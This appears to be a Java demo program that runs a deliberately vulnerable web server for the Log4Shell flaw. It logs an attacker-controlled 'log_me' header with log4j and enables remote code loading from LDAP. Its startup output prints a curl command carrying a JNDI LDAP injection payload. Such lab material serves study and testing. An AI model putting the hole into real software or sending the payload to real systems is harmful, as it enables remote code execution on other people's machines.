// Based on BalusC example from:
// http://stackoverflow.com/questions/3732109/simple-http-server-in-java-using-only-java-se-api
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Map;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jWebServer {

  public static void main(String[] args) throws Exception {
    System.out.println("This will start a very simple web server that will trigger");
    System.out.println("the Log4Shell exploit.  Pass in a header called log_me and");
    System.out.println("this will be logged via log4j.  The default port is 8888 but");
    System.out.println("it will take a single paramter as a port");
    System.out.println("");
    System.out.println("You can call it using curl. Depending on your terminal you ");
    System.out.println("may need to escape the $ :");
    System.out.println("curl -H 'log_me: ${jndi:ldap://127.0.0.1:1389/#MiniMet}' http://127.0.0.1:8888/");

    int port = 8888;
    if(args.length > 0){
      port = Integer.parseInt(args[0]);
    }
    new Log4jWebServer().runServer(port); 
  }

  public void runServer(int port) throws IOException{
    HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
    server.createContext("/", new MyHandler());
    server.setExecutor(null); // creates a default executor
    server.start();
  }

  static class MyHandler implements HttpHandler {
    private static final Logger logger = LogManager.getLogger(Log4jWebServer.class);
    @Override
    public void handle(HttpExchange t) throws IOException {
      // Logging IP address of request to stdout
      System.out.println("Request received from: " + t.getRemoteAddress().toString());

      String log_me = t.getRequestHeaders().getFirst("log_me");

      System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
      this.logger.error(log_me);

      String response = "<html><body><h1>Please do not host this on a public computer!!!!</h1>\n";
      if(log_me == null){
        response += "<H3>No logs were written.  Please see the startup output for how to enable logs.</H3>";
      }
      else{
        response += "<H3>Your log_me header was : ("+log_me+")</H3>";
      }
      response += "</body></html>\n";

      // Sending response
      t.sendResponseHeaders(200, response.length());
      OutputStream os = t.getResponseBody();
      os.write(response.getBytes());
      os.close();
    }
  }
}
